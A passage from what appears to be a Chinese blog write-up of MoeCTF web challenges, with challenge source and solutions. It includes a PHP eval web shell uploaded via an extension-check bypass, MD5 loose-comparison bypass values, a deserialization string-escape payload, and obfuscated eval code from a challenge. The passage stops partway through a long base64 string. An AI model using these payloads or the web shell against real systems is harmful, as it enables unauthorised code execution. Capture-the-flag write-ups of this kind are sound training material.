punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'moectf'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'moectf(.*)'</span><span class="token punctuation">,</span> post<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">-6]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'&lt;h3>&lt;font color="red">(.*)&lt;/font>&lt;/h3>'</span><span class="token punctuation">,</span> post<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    </code></pre><h4 id="moe图床-文件上传"><a href="#moe图床-文件上传" class="headerlink" title="moe图床(文件上传)"></a>moe图床(文件上传)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">const</span> allowedExtensions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>           <span class="token keyword">const</span> <span class="token constant">fileExtension</span> <span class="token operator">=</span> file<span class="token operator">.</span>name<span class="token operator">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>allowedExtensions<span class="token operator">.</span><span class="token function">includes</span><span class="token punctuation">(</span>fileExtension<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'只允许上传后缀名为png的文件！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">return</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span></code></pre><p>审计源码时发现，只是简单的用<code>.</code>作为分隔判断了第一个后缀名，于是上传</p><pre class="language-php" data-language="php"><code class="language-php">1.png.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'attack'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>GET: http://localhost:6472/uploads/1.png.phpPOST: attack=system('tac /flag');</code></pre><h4 id="大海捞针"><a href="#大海捞针" class="headerlink" title="大海捞针"></a>大海捞针</h4><p>打开题目可见只需要bp跑一到一千的数字即可</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">use</span> <span class="token operator">/</span><span class="token operator">?</span>id<span class="token operator">=</span><span class="token operator">&lt;</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">1000</span><span class="token operator">></span> to connect to different parallel universes</code></pre><h4 id="meo图床-文件包含-md5"><a href="#meo图床-文件包含-md5" class="headerlink" title="meo图床(文件包含 md5)"></a>meo图床(文件包含 md5)</h4><p>这次增加了文件头检测于是加上<code>GIF89a</code>于是上传成功，不过发现并不是直接给出文件目录，而是通过参数传递，于是猜测文件包含漏洞</p><p><img src="meo%E5%9B%BE%E5%BA%8A.png" loading="lazy"></p><p>得到提示访问<code>Fl3g_n0t_Here_dont_peek!!!!!.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$param1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$param2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$param1</span> <span class="token operator">!==</span> <span class="token variable">$param2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$md5Param1</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$param1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$md5Param2</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$md5Param1</span> <span class="token operator">==</span> <span class="token variable">$md5Param2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"O.O!! "</span> <span class="token operator">.</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"O.o??"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"o.O?"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"O.o?"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>简单的md5绕过，可以数组绕过，也可以md5 0e绕过</p><pre class="language-php" data-language="php"><code class="language-php">Payload：param1<span class="token operator">=</span><span class="token constant">QNKCDZO</span><span class="token operator">&amp;</span>param2<span class="token operator">=</span><span class="token number">240610708</span>    <span class="token constant">QLTHNDT</span> <span class="token operator">-></span> <span class="token property">0e405967825401955372549139051580</span>    <span class="token constant">QNKCDZO</span> <span class="token operator">-></span> <span class="token property">0e830400451993494058024219903391</span>     s878926199a <span class="token operator">-></span> <span class="token property">0e545993274517709034328855841020</span>param1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">11</span><span class="token operator">&amp;</span>param2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">22</span></code></pre><h4 id="夺命十三枪-反序列化字符串逃逸"><a href="#夺命十三枪-反序列化字符串逃逸" class="headerlink" title="夺命十三枪(反序列化字符串逃逸)"></a>夺命十三枪(反序列化字符串逃逸)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Hanxin.exe.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$Chant</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'chant'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'chant'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'夺命十三枪'</span><span class="token punctuation">;</span><span class="token variable">$new_visitor</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span><span class="token punctuation">(</span><span class="token variable">$Chant</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$before</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$new_visitor</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$after</span> <span class="token operator">=</span> <span class="token class-name static-context">Deadly_Thirteen_Spears</span><span class="token operator">::</span><span class="token function">Make_a_Move</span><span class="token punctuation">(</span><span class="token variable">$before</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your Movements: '</span> <span class="token operator">.</span> <span class="token variable">$after</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$after</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Even Caused A Glitch..."</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>Your Movements: O:34:"Omg_It_Is_So_Cool_Bring_Me_My_Flag":2:&#123;s:5:"Chant";s:15:"夺命十三枪";s:11:"Spear_Owner";s:6:"Nobody";&#125;Far away from COOL...</code></pre><p>看到了<code>require_once(&#39;Hanxin.exe.php&#39;);</code></p><p>Hanxin.exe.php</p><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SCRIPT_FILENAME'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Deadly_Thirteen_Spears</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>        <span class="token string double-quoted-string">"di_yi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Lovesickness"</span><span class="token punctuation">,</span> <span class="token comment">//11 12</span>        <span class="token string double-quoted-string">"di_er_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Heartbreak"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_san_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Blind_Dragon"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_si_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Romantic_charm"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_wu_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Peerless"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_liu_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"White_Dragon"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_qi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Penetrating_Gaze"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_ba_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Kunpeng"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_jiu_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Night_Parade_of_a_Hundred_Ghosts"</span><span class="token punctuation">,</span> <span class="token comment">// 12 32</span>        <span class="token string double-quoted-string">"di_shi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Overlord"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_shi_yi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Letting_Go"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_shi_er_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Decisive_Victory"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_shi_san_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Unrepentant_Lethality"</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">Make_a_Move</span><span class="token punctuation">(</span><span class="token variable">$move</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="token keyword">as</span> <span class="token variable">$index</span> <span class="token operator">=></span> <span class="token variable">$movement</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$move</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$index</span><span class="token punctuation">,</span> <span class="token variable">$movement</span><span class="token punctuation">,</span> <span class="token variable">$move</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$move</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$Chant</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$Spear_Owner</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Nobody'</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$chant</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Chant</span> <span class="token operator">=</span> <span class="token variable">$chant</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Spear_Owner</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Nobody'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Spear_Owner</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'MaoLei'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string single-quoted-string">'Far away from COOL...'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string double-quoted-string">"Omg You're So COOOOOL!!! "</span> <span class="token operator">.</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FLAG'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>只要触发<code>__toString</code>并让<code>Spear_Owner === &#39;MaoLei&#39;</code>就行，本来看着<code>Make_a_Move</code>这个方法没反应过来可以反序列化字符串逃逸，看了wp得到提示</p><p>那么只要通过Chant来构造，使反序列化字符串逃逸</p><pre class="language-php" data-language="php"><code class="language-php">先看正常的反序列化<span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">34</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Omg_It_Is_So_Cool_Bring_Me_My_Flag"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Chant"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Spear_Owner"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Nobody"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>将Chant替换为<span class="token number">1</span><span class="token string double-quoted-string">";s:11:"</span>Spear_Owner<span class="token string double-quoted-string">";s:6:"</span>Nobody<span class="token string double-quoted-string">";&#125; ,O:34:"</span>Omg_It_Is_So_Cool_Bring_Me_My_Flag<span class="token string double-quoted-string">":2:&#123;s:5:"</span>Chant<span class="token string double-quoted-string">";s:36:"</span><span class="token number">1</span><span class="token string double-quoted-string">";s:11:"</span>Spear_Owner<span class="token string double-quoted-string">";s:6:"</span>Nobody<span class="token string double-quoted-string">";&#125;"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Spear_Owner"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Nobody"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>字符串增加了<span class="token number">35</span>，<span class="token string double-quoted-string">"di_yi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Lovesickness"</span><span class="token punctuation">,</span> <span class="token comment">//11 12 构造35个di_yi_qiang即可字符串逃逸</span>Payload：<span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>chant<span class="token operator">=</span>di_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiang<span class="token string double-quoted-string">";s:11:"</span>Spear_Owner<span class="token string double-quoted-string">";s:6:"</span>MaoLei"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h4><p>题目代码:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> secrets <span class="token keyword">import</span> users<span class="token punctuation">,</span> salt<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> base64<span class="token keyword">import</span> json<span class="token keyword">import</span> http<span class="token punctuation">.</span>server<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    FLAG <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">gethash</span><span class="token punctuation">(</span><span class="token operator">*</span>items<span class="token punctuation">)</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> items<span class="token punctuation">:</span>        <span class="token keyword">if</span> item <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        c <span class="token operator">^</span><span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>item<span class="token punctuation">&#125;</span></span><span class="token string">]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"big"</span><span class="token punctuation">)</span> <span class="token comment"># it looks so complex! but is it safe enough?</span>    <span class="token keyword">return</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">assert</span> <span class="token string">"admin"</span> <span class="token keyword">in</span> users<span class="token keyword">assert</span> users<span class="token punctuation">[</span><span class="token string">"admin"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"admin"</span>hashed_users <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span>gethash<span class="token punctuation">(</span>k<span class="token punctuation">,</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> k<span class="token punctuation">,</span>v <span class="token keyword">in</span> users<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164</span><span class="token operator">^</span><span class="token number">8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">,</span><span class="token string">"big"</span><span class="token punctuation">,</span>signed<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token boolean">None</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string">"\x00"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># what is it?</span>    <span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># ummm...? It looks like it's just base64 encoding it 5 times? truely?</span>        <span class="token keyword">return</span> data__page__ <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">"PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5zaWduaW48L3RpdGxlPgogICAgPHNjcmlwdD4KICAgICAgICBbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoK3t9K1tdKVsrISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXVtbXV0rW10pWytbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoW10rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKVshK1tdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKShbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1td